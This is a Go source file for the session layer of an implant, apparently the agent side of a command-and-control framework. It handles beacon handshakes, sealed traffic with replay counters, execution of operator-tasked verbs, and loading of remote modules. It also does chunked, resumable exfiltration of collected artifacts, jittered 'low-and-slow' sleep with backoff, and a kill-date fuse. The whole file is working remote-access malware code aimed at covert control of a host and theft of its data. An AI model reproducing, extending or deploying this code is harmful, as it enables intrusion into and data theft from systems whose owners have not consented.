// Package session holds the cross-contact state one implant run carries:
// the seal and its counter, the result batch awaiting delivery, and the
// resumable exfil runs (ADR-010's upload arm). The carriage borrows the
// session; the session owns nothing transport-shaped -- so held state
// survives reconnects and failed contacts.
package session

import (
	"crypto/sha256"
	"encoding/binary"
	"fmt"
	"math/rand"
	"strings"
	"time"

	"rodimplant/internal/envelope"
	"rodimplant/internal/plugins"
	"rodimplant/internal/wire"

	"google.golang.org/protobuf/proto"
)

// The frame-carriage slice size: the same 512 KiB budget the platform's
// chunkers honor, under the frame-layer sizing rule.
const ExfilChunkBytes = 512 * 1024

// ExfilContactBudget is the exfil byte budget one contact carries: the
// envelope's body cap is 16 MiB of wire bytes (base64-expanded when
// sealed), so the run's slices leave room for the handshake, results, and
// demands beside them. A run larger than this spans contacts -- that
// spanning is the arm's point.
const ExfilContactBudget = 8 * 1024 * 1024

// Cycles an upload run may make no progress before the session drops it:
// the task's result already crossed, so the honest end of a run the server
// never reports on is losing the artifact, not parking its bytes forever.
const exfilIdleCycles = 3

// Handler executes one verb against its opaque argument string: the
// outcome, the output line, and -- when the verb produced bulk data -- the
// artifact the result's ExfilChunk run will carry.
type Handler func(arguments string) (outcome wire.TaskOutcome, output string, artifact *Artifact)

// Artifact is the bulk data a verb produced: the named bytes that stream
// to the artifact store as offset-bearing ExfilChunk frames after the
// result.
type Artifact struct {
	Name        string
	ContentType string
	Data        []byte
}

// exfilRun is one upload run: the artifact bytes a task produced, held on
// the session until the server's seam report says the run landed. Only a
// report moves the confirmed seam -- optimistic sends never do, so a
// contact that dies mid-flight re-sends from the last confirmed seam.
type exfilRun struct {
	task         string
	name         string
	contentType  string
	data         []byte
	sha          [32]byte
	confirmed    int
	lastReported int
	idleCycles   int
}

// moduleVerbs is the module family's own verbs (architecture.md Sec 5.4):
// dispatched by the session against the plugin registry, advertised when
// the bake names them, and reserved -- a module cannot own them.
var moduleVerbs = map[string]bool{
	"module.load":   true,
	"module.unload": true,
	"module.list":   true,
}

// moduleTable is the plugin-registry surface the session drives: the
// concrete registry by default, a stub in the tests.
type moduleTable interface {
	Load(handle string, payload []byte, expectedSHA256 string) (string, error)
	Unload(name string) (string, error)
	List() string
	Dispatch(verb, arguments string) (wire.TaskOutcome, string, *plugins.Artifact, bool)
	AdvertisedVerbs() []string
}

// Session is the implant's cross-carriage state.
type Session struct {
	ImplantID  string
	Advertised []string

	SleepSeconds  float64
	JitterSeconds float64
	KillDate      string

	Seal    *envelope.Key
	Verbs   map[string]Handler
	answers map[string]*wire.Frame

	counter   uint64
	outbox    []*wire.Frame
	delivered []*wire.Frame
	exfil     []*exfilRun
	staged    map[string]*stagedPending
	plugins   moduleTable
}

// New builds a session over the enrolled identity and the compiled
// handlers. The advertised verb list is the bake's set intersected with
// what this binary can run: the compiled handlers plus the module family.
func New(implantID string, bakedVerbs []string, sleepSeconds, jitterSeconds float64, killDate string, seal *envelope.Key, handlers map[string]Handler) *Session {
	s := &Session{
		ImplantID:     implantID,
		SleepSeconds:  sleepSeconds,
		JitterSeconds: jitterSeconds,
		KillDate:      killDate,
		Seal:          seal,
		Verbs:         handlers,
		answers:       map[string]*wire.Frame{},
		staged:        map[string]*stagedPending{},
	}
	reserved := make([]string, 0, len(handlers)+len(moduleVerbs))
	for verb := range handlers {
		reserved = append(reserved, verb)
	}
	for verb := range moduleVerbs {
		reserved = append(reserved, verb)
	}
	s.plugins = plugins.New(reserved)
	for _, verb := range bakedVerbs {
		if _, compiled := handlers[verb]; compiled || moduleVerbs[verb] {
			s.Advertised = append(s.Advertised, verb)
		}
	}
	return s
}

// HandshakeFrame is the frame every contact opens with: identity,
// protocol version, the advertised set -- the baked verbs beside the loader
// rows this build hosts (ADR-020) and every verb a loaded module
// registered -- and the fresh cadence. The module rows are read at every
// contact, so a load widens the advertisement at the next one.
func (s *Session) HandshakeFrame() *wire.Frame {
	request := &wire.HandshakeRequest{
		Version:       &wire.ProtocolVersion{Major: 1, Minor: 0},
		ImplantId:     s.ImplantID,
		SleepSeconds:  &s.SleepSeconds,
		JitterSeconds: &s.JitterSeconds,
	}
	seen := make(map[string]bool)
	for _, row := range append(append(append([]string{}, s.Advertised...),
		plugins.LoaderCapabilities()...), s.plugins.AdvertisedVerbs()...) {
		if row != "" && !seen[row] {
			seen[row] = true
			request.Capabilities = append(request.Capabilities, row)
		}
	}
	return FrameOf(request, wire.FrameKind_FRAME_KIND_UNSPECIFIED)
}

// EncodeOutgoing renders frames as this contact's outgoing body: the
// framed bytes behind a fresh big-endian counter, sealed under the bake's
// key when it carries one. The counter burns per attempt, not per
// delivery, so a retransmission never trips the server's replay floor.
func (s *Session) EncodeOutgoing(frames []*wire.Frame) (body []byte, contentType string, err error) {
	encoded := wire.EncodeFrames(frames)
	if s.Seal == nil {
		return encoded, "application/octet-stream", nil
	}
	s.counter++
	plain := make([]byte, 8+len(encoded))
	binary.BigEndian.PutUint64(plain, s.counter)
	copy(plain[8:], encoded)
	sealed, err := envelope.SealContactBody(string(plain), envelope.ContactRequestAAD, *s.Seal)
	if err != nil {
		return nil, "", fmt.Errorf("seal: %w", err)
	}
	return sealed, "text/plain", nil
}

// DecodeIncoming opens a response body: sealed under the response's own
// purpose tag when the run seals, else the plaintext frames.
func (s *Session) DecodeIncoming(body []byte) ([]*wire.Frame, error) {
	plain := body
	if s.Seal != nil {
		opened, err := envelope.OpenContactBody(body, envelope.ContactResponseAAD, *s.Seal)
		if err != nil {
			return nil, fmt.Errorf("unseal: %w", err)
		}
		plain = opened
	}
	return wire.ParseFrames(plain)
}

// HandshakeAnswered reads the contact's first frame: OK crosses, every
// other status is permanent for this artifact (the caller terminates
// rather than retries).
func (s *Session) HandshakeAnswered(first *wire.Frame) error {
	var answer wire.HandshakeResponse
	if err := proto.Unmarshal(first.Payload, &answer); err != nil {
		return fmt.Errorf("handshake answer: %w", err)
	}
	if answer.Status != wire.HandshakeStatus_HANDSHAKE_STATUS_OK {
		return fmt.Errorf("handshake refused: status %d", answer.Status)
	}
	return nil
}

// AcceptTasking reads the response body past its handshake frame. Frames
// are discriminated on kind first, as the wire contract states: the seam
// report advances an exfil run's confirmed bytes, and the kindless
// positional frames split by shape -- tasking carries a verb, a staged
// chunk never does (its sequence field cannot land in the verb's wire
// type), so a kindless frame parses as tasking only when its verb field is
// set and as a chunk otherwise. A task whose result already crossed is a
// redelivery -- the cached result answers again, nothing re-executes.
func (s *Session) AcceptTasking(frames []*wire.Frame) {
	for _, f := range frames {
		switch f.Kind {
		case wire.FrameKind_FRAME_KIND_EXFIL_PROGRESS:
			var progress wire.ExfilProgress
			if err := proto.Unmarshal(f.Payload, &progress); err == nil {
				s.ApplyExfilProgress(progress.TaskId, progress.Name, progress.HeldBytes)
			}
		case wire.FrameKind_FRAME_KIND_UNSPECIFIED:
			var task wire.TaskRequest
			if err := proto.Unmarshal(f.Payload, &task); err == nil && task.Verb != "" {
				s.Dispatch(&task)
				continue
			}
			var chunk wire.StagedChunk
			if err := proto.Unmarshal(f.Payload, &chunk); err == nil {
				s.acceptStagedChunk(&chunk)
			}
		}
	}
}

// Dispatch runs one dispatched task: the dedup half answers from the cache,
// a staged task registers its transfer instead of executing, the module
// family runs against the plugin registry, and everything else executes
// against the compiled handler table -- falling through to the loaded
// modules' routes when no compiled handler holds the verb. The result (and,
// when the verb produced bulk, its exfil run) queues from exactly one
// execution.
func (s *Session) Dispatch(task *wire.TaskRequest) {
	if cached, ok := s.answers[task.TaskId]; ok {
		s.outbox = append(s.outbox, cached)
		return
	}
	if task.StagedBytes != nil {
		s.demandStaged(task)
		return
	}
	switch task.Verb {
	case "module.load":
		s.queueResult(task.TaskId, wire.TaskOutcome_TASK_OUTCOME_FAILED,
			"module.load stages its bytes as task content; issue it with the module as content", nil)
		return
	case "module.unload":
		outcome, output := s.moduleUnload(task.Arguments)
		s.queueResult(task.TaskId, outcome, output, nil)
		return
	case "module.list":
		s.queueResult(task.TaskId, wire.TaskOutcome_TASK_OUTCOME_SUCCEEDED, s.plugins.List(), nil)
		return
	}
	if handler, ok := s.Verbs[task.Verb]; ok {
		outcome, output, artifact := handler(task.Arguments)
		s.queueResult(task.TaskId, outcome, output, artifact)
		return
	}
	if outcome, output, artifact, routed := s.plugins.Dispatch(task.Verb, task.Arguments); routed {
		s.queueResult(task.TaskId, outcome, output, artifactOf(artifact))
		return
	}
	s.queueResult(task.TaskId, wire.TaskOutcome_TASK_OUTCOME_FAILED,
		fmt.Sprintf("unknown verb %s", task.Verb), nil)
}

// moduleUnload retracts one module by name, the report line or the grammar
// refusal as its outcome.
func (s *Session) moduleUnload(arguments string) (wire.TaskOutcome, string) {
	name := strings.TrimSpace(arguments)
	if name == "" {
		return wire.TaskOutcome_TASK_OUTCOME_FAILED, "module.unload expects '<name>'"
	}
	report, err := s.plugins.Unload(name)
	if err != nil {
		return wire.TaskOutcome_TASK_OUTCOME_FAILED, err.Error()
	}
	return wire.TaskOutcome_TASK_OUTCOME_SUCCEEDED, report
}

// artifactOf widens a module run's artifact into the session's shape -- the
// exfil arm's registration is identical for both sources.
func artifactOf(artifact *plugins.Artifact) *Artifact {
	if artifact == nil {
		return nil
	}
	return &Artifact{Name: artifact.Name, ContentType: artifact.ContentType, Data: artifact.Data}
}

func (s *Session) queueResult(taskID string, outcome wire.TaskOutcome, output string, artifact *Artifact) {
	result := &wire.Frame{
		Payload: mustMarshal(&wire.TaskResult{TaskId: taskID, Outcome: outcome, Output: output}),
		Kind:    wire.FrameKind_FRAME_KIND_TASK_RESULT,
	}
	s.outbox = append(s.outbox, result)
	s.answers[taskID] = result
	if artifact != nil {
		sum := sha256.Sum256(artifact.Data)
		s.exfil = append(s.exfil, &exfilRun{
			task:        taskID,
			name:        artifact.Name,
			contentType: artifact.ContentType,
			data:        artifact.Data,
			sha:         sum,
		})
	}
}

// queueResultWithSha reports a staged task's result with the reassembled
// payload's hex SHA-256 -- the both-side verification half (ADR-010): the
// server compares it against the artifact it served, so a task only
// records Succeeded when both sides hold the same bytes.
func (s *Session) queueResultWithSha(taskID string, outcome wire.TaskOutcome, output string, artifact *Artifact, payloadSha string) {
	result := &wire.Frame{
		Payload: mustMarshal(&wire.TaskResult{
			TaskId: taskID, Outcome: outcome, Output: output, PayloadSha256: &payloadSha,
		}),
		Kind: wire.FrameKind_FRAME_KIND_TASK_RESULT,
	}
	s.outbox = append(s.outbox, result)
	s.answers[taskID] = result
}

// Batch is the queued result frames this contact carries.
func (s *Session) Batch() []*wire.Frame { return s.outbox }

// BatchCrossed marks the batch delivered: the frames move to the
// redelivery cache and leave the queue.
func (s *Session) BatchCrossed() {
	s.delivered = append(s.delivered, s.outbox...)
	s.outbox = nil
}

// ExfilFrames slices the pending runs into this contact's frames: each
// run serves from its confirmed seam within the budget, every slice at
// its absolute offset with the run's declared hash. Regenerated every
// cycle -- a contact that dies mid-flight never moved the seam, so the
// next one re-sends exactly the unconfirmed slices (placement is
// idempotent server-side, a duplicate is a no-op, not corruption).
func (s *Session) ExfilFrames(budget int) []*wire.Frame {
	var frames []*wire.Frame
	for _, run := range s.exfil {
		at := run.confirmed
		for at < len(run.data) && budget > 0 {
			take := min(ExfilChunkBytes, len(run.data)-at, budget)
			chunk := &wire.ExfilChunk{
				TaskId:        run.task,
				Name:          run.name,
				ContentType:   run.contentType,
				Sequence:      uint64(at / ExfilChunkBytes),
				Terminal:      at+take == len(run.data),
				Data:          run.data[at : at+take],
				Offset:        u64(uint64(at)),
				PayloadSha256: run.sha[:],
			}
			frames = append(frames, FrameOf(chunk, wire.FrameKind_FRAME_KIND_EXFIL_CHUNK))
			at += take
			budget -= take
		}
	}
	return frames
}

// ApplyExfilProgress moves a run's confirmed seam to the byte count the
// server's report names -- ahead or back (an evicted or restarted server
// rewinds the sender to re-serve from it) -- and retires a run whose
// report covers it whole.
func (s *Session) ApplyExfilProgress(task, name string, held uint64) {
	kept := s.exfil[:0]
	for _, run := range s.exfil {
		if run.task == task && run.name == name {
			run.confirmed = int(held)
			if run.confirmed >= len(run.data) {
				continue // the report at the run's end retires it
			}
		}
		kept = append(kept, run)
	}
	s.exfil = kept
}

// ExfilCycleEnd runs at every contact boundary: a run whose seam a report
// moved keeps its patience, one that heard nothing counts an idle cycle,
// and one idle past the bound is dropped.
func (s *Session) ExfilCycleEnd() {
	kept := s.exfil[:0]
	for _, run := range s.exfil {
		switch {
		case run.confirmed != run.lastReported:
			run.lastReported = run.confirmed
			run.idleCycles = 0
			kept = append(kept, run)
		case run.idleCycles+1 >= exfilIdleCycles:
			// dropped: the run's result already crossed
		default:
			run.idleCycles++
			kept = append(kept, run)
		}
	}
	s.exfil = kept
}

// ExfilPending reports whether any upload run is still owed.
func (s *Session) ExfilPending() bool { return len(s.exfil) > 0 }

// Sleep runs the jittered inter-cycle pause.
func (s *Session) Sleep() {
	base := max(s.SleepSeconds, 0.1)
	time.Sleep(time.Duration((base + jitter(s.JitterSeconds)) * float64(time.Second)))
}

// BackoffSleep widens the inter-cycle pause by consecutive failures --
// the exponential reconnect backoff the low-and-slow posture calls for.
func (s *Session) BackoffSleep(failures uint32) {
	widened := min(max(s.SleepSeconds, 1)*float64(uint32(1)<<min(failures, 5)), 600)
	time.Sleep(time.Duration(max(widened+jitter(s.JitterSeconds), 0.1) * float64(time.Second)))
}

// KillDatePassed reports whether the baked fuse has blown.
func (s *Session) KillDatePassed() bool {
	if s.KillDate == "" {
		return false
	}
	kill, err := time.Parse(time.RFC3339, s.KillDate)
	if err != nil {
		return false
	}
	return time.Now().After(kill)
}

// jitter draws one half-width around zero; a zero width is exact.
func jitter(width float64) float64 {
	if width <= 0 {
		return 0
	}
	return (rand.Float64()*2 - 1) * width
}

// FrameOf wraps a protobuf message as an upstream Frame.
func FrameOf(message proto.Message, kind wire.FrameKind) *wire.Frame {
	return &wire.Frame{Payload: mustMarshal(message), Kind: kind}
}

func mustMarshal(message proto.Message) []byte {
	payload, err := proto.Marshal(message)
	if err != nil {
		// The generated messages marshal without error; a failure here is
		// a programming fault, and dropping the frame silently is safer
		// than taking the run down.
		return nil
	}
	return payload
}

func u64(v uint64) *uint64 { return &v }
